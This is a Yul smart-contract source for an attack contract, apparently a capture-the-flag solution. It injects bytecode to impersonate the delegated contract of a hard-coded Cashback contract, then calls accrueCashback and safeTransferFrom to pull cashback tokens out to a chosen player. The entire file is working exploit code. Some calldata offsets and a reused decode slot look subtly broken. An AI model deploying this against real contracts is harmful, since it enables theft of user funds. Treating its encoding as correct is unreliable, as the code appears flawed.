object "InjectedCashbackAttack" {
    code {
        let runtimeSize := datasize("runtime")
        datacopy(0, dataoffset("runtime"), runtimeSize)
        return (0x00, runtimeSize)
    }

    object "runtime" {
        code {
            // Code we want to inject to masquerade as the deletegated contract
            // Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
            verbatim_0i_0o(hex"603756dCc409Af2566c47F6DA4d30Eae8155b332A6407800000000000000000000000000000000000000000000000000000000000000005B")

            // protection against sending Ether
            require(iszero(callvalue()))

            // dispatchers
            switch selector()
            case 0x61bd21b2 { // attack(address, address, address, uint256, uint256)
                let cashbackAddr := decodeAsAddr(0)
                let player := decodeAsAddr(1)
                let currency := decodeAsAddr(2)
                let currencyId := decodeAsUint(2)
                let expenseAmt := decodeAsUint(3)
                let cashbackAmt := decodeAsUint(4)

                // free memory pointer
                let ptr := mload(0x40)
                datacopy(ptr, dataoffset("accrueCashbackSel"), 4)
                mstore(add(ptr, 4), currency)
                mstore(add(ptr, 36), expenseAmt)
                // total calldata size = 4 (selector) + 32 bytes (addr) + 32 bytes (uint256) = 68
                let calldataSize := 68

                // Calling cashback.accrueCashback()
                let success := call(
                    gas(),
                    cashbackAddr,
                    0,      // no ETH
                    ptr,    // calldata start
                    calldataSize, // calldata size
                    0,      // output buffer
                    0       // output length
                )
                require(success)

                // Calling safeTransferFrom(address,address,uint256,uint256,bytes)
                // cashback.safeTransferFrom(address(this), player, nativeAmt, CurrencyLibrary.NATIVE_CURRENCY.toId(), "");
                ptr := mload(0x40)
                datacopy(ptr, dataoffset("safeTransferFromSel"), 4)
                mstore(add(ptr, 4), cashbackAddr)  // contract
                mstore(add(ptr, 36), player)       // player
                mstore(add(ptr, 98), cashbackAmt)
                mstore(add(ptr, 130), currencyId)  // currencyId
                mstore(add(ptr, 162), 0)
                calldataSize := 194

                success := call(
                    gas(),
                    cashbackAddr,
                    0,      // no ETH
                    ptr,    // calldata start
                    calldataSize,
                    0,      // output buffer
                    0       // output length
                )
                require(success)

                return (0, 0)
            }
            case 0x8380edb7 { // isUnlocked()
                returnTrue()
            }
            case 0xf360c183 { // setNonce(uint256)
                setNonce(decodeAsUint(0))
                return(0, 0)
            }
            case 0x34b15118 { // consumeNonce()
                returnUint(nonce())
            }
            default {
                revert(0, 0)
            }

            /* ------- calldata decoding functions ------- */
            function selector() -> s {
                s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)
            }

            function decodeAsUint(offset) -> v {
                let pos := add(4, mul(offset, 0x20))
                if lt(calldatasize(), add(pos, 0x20)) {
                    revert(0,0)
                }
                v := calldataload(pos)
            }

            function decodeAsAddr(offset) -> v {
                v := decodeAsUint(offset)
                if iszero(iszero(and(v, not(0xffffffffffffffffffffffffffffffffffffffff)))) {
                    revert(0, 0)
                }
            }

            /* ------- calldata encoding functions ------- */
            function returnUint(v) {
                mstore(0, v)
                return (0, 0x20)
            }

            function returnTrue() {
                returnUint(1)
            }

            /* ------- storage layout ------- */
            function noncePos() -> p {
                p := 0
            }

            /* ------- storage access ------- */
            function nonce() -> n {
                n := sload(noncePos())
            }

            function setNonce(n) {
                sstore(noncePos(), n)
            }

            /* ------- utility functions ------- */
            function require(condition) {
                if iszero(condition) { revert(0, 0) }
            }
        } // end of code

        data "accrueCashbackSel"    hex"ebc39613"
        data "safeTransferFromSel"  hex"f242432a" // safeTransferFrom(address,address,uint256,uint256,bytes)
    }
}
